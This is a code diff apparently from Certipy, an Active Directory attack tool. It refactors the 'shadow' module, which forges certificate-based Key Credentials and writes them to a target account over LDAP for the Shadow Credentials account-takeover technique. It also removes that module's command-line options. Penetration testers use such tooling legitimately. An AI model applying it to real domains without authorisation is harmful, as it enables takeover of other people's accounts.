@@ -1,6 +1,5 @@
 import argparse
-import logging
-from typing import Callable, List, Tuple
+from typing import List, Tuple
 
 import ldap3
 import OpenSSL
@@ -10,13 +9,12 @@ from dsinternals.common.data.hello.KeyCredential import KeyCredential
 from dsinternals.system.DateTime import DateTime
 from dsinternals.system.Guid import Guid
 
-from certipy import target
-from certipy.auth import Authenticate
-from certipy.certificate import create_pfx, der_to_cert, der_to_key, rsa, x509
-from certipy.ldap import LDAPConnection, LDAPEntry
-from certipy.target import Target
+from certipy.lib.certificate import create_pfx, der_to_cert, der_to_key, rsa, x509
+from certipy.lib.ldap import LDAPConnection, LDAPEntry
+from certipy.lib.logger import logging
+from certipy.lib.target import Target
 
-NAME = "shadow"
+from .auth import Authenticate
 
 
 class Shadow:
@@ -101,7 +99,12 @@ class Shadow:
         self, target_dn: str, subject: str
     ) -> Tuple[X509Certificate2, KeyCredential, str]:
         logging.info("Generating certificate")
-        certificate = X509Certificate2(
+
+        if len(subject) >= 64:
+            logging.warning("Subject too long. Limiting subject to 64 characters.")
+            subject = subject[:64]
+
+        cert = X509Certificate2(
             subject=subject,
             keySize=2048,
             notBefore=(-40 * 365),
@@ -111,7 +114,7 @@ class Shadow:
 
         logging.info("Generating Key Credential")
         key_credential = KeyCredential.fromX509Certificate2(
-            certificate=certificate,
+            certificate=cert,
             deviceId=Guid(),
             owner=target_dn,
             currentTime=DateTime(),
@@ -120,13 +123,13 @@ class Shadow:
         device_id = key_credential.DeviceId.toFormatD()
         logging.info("Key Credential generated with DeviceID %s" % repr(device_id))
 
-        return (certificate, key_credential, device_id)
+        return (cert, key_credential, device_id)
 
     def add_new_key_credential(
         self, target_dn: str, user: LDAPEntry
     ) -> Tuple[X509Certificate2, KeyCredential, List[bytes], str]:
         cert, key_credential, device_id = self.generate_key_credential(
-            target_dn, user.get("distinguishedName")
+            target_dn, "CN=%s" % user.get("sAMAccountName")
         )
 
         if self.verbose:
@@ -436,44 +439,3 @@ def entry(options: argparse.Namespace) -> None:
     }
 
     actions[options.shadow_action]()
-
-
-def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
-    subparser = subparsers.add_parser(
-        NAME, help="Abuse Shadow Credentials for account takeover"
-    )
-
-    subparser.add_argument(
-        "shadow_action",
-        choices=["list", "add", "remove", "clear", "info", "auto"],
-        help="Key Credentials action",
-    )
-    subparser.add_argument(
-        "-account",
-        action="store",
-        metavar="target account",
-        help="Account to target. If omitted, the user "
-        "specified in the target will be used",
-    )
-    subparser.add_argument(
-        "-device-id",
-        action="store",
-        help="Device ID of the Key Credential Link",
-    )
-    subparser.add_argument("-debug", action="store_true", help="Turn debug output on")
-
-    group = subparser.add_argument_group("output options")
-    group.add_argument("-out", action="store", metavar="output file name")
-
-    group = subparser.add_argument_group("connection options")
-    group.add_argument(
-        "-scheme",
-        action="store",
-        metavar="ldap scheme",
-        choices=["ldap", "ldaps"],
-        default="ldaps",
-    )
-
-    target.add_argument_group(subparser, connection_options=group)
-
-    return NAME, entry
